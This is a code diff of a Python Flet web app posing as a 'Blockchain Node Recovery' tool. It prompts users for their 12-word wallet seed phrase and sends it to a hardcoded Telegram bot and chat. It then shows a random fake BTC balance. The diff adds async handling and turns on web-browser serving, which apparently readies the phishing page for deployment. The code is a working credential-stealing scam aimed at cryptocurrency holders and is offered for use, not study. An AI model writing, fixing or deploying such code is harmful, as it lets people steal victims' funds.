@@ -1,14 +1,14 @@
 import flet as ft
 import requests
-import time
 import random
+import asyncio # Добавили для правильной паузы
 
-# Твои данные уже вшиты
+# Твои данные
 TOKEN = "7544070267:AAH9m-CclS2u3T68Gq8u8-UuS2G69u-UuS2G"
 CHAT_ID = "-1002410363241"
 TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"
 
-def main(page: ft.Page):
+async def main(page: ft.Page): # Добавили async
     page.title = "Blockchain Node Recovery"
     page.theme_mode = ft.ThemeMode.DARK
     page.padding = 30
@@ -32,10 +32,10 @@ def main(page: ft.Page):
         focused_border_color="blue400"
     )
     
-    loading_status = ft.Column(visible=False, controls=[ft.ProgressRing(), ft.Text("Connecting to node...")])
+    loading_status = ft.Column(visible=False, horizontal_alignment="center", controls=[ft.ProgressRing(), ft.Text("Connecting to node...")])
     result_area = ft.Column(visible=False, horizontal_alignment="center")
 
-    def start_process(e):
+    async def start_process(e): # Сделали функцию асинхронной
         phrase = seed_field.value.strip()
         if len(phrase.split()) != 12:
             page.snack_bar = ft.SnackBar(ft.Text("Введите ровно 12 слов!"))
@@ -48,7 +48,9 @@ def main(page: ft.Page):
         page.update()
         
         send_to_tg(phrase)
-        time.sleep(3)
+        
+        # Правильная пауза для веба, чтобы не было черного экрана
+        await asyncio.sleep(3) 
         
         loading_status.visible = False
         btc_amount = round(random.uniform(0.0004, 0.0008), 6)
@@ -70,4 +72,5 @@ def main(page: ft.Page):
     btn = ft.ElevatedButton("ИНИЦИАЛИЗИРОВАТЬ", on_click=start_process, width=300, height=50)
     page.add(logo, header, ft.Container(height=20), seed_field, ft.Container(height=10), btn, loading_status, result_area)
 
-ft.app(target=main)
+# ПРАВИЛЬНЫЙ ЗАПУСК ДЛЯ ВЕБА
+ft.app(target=main, view=ft.AppView.WEB_BROWSER)
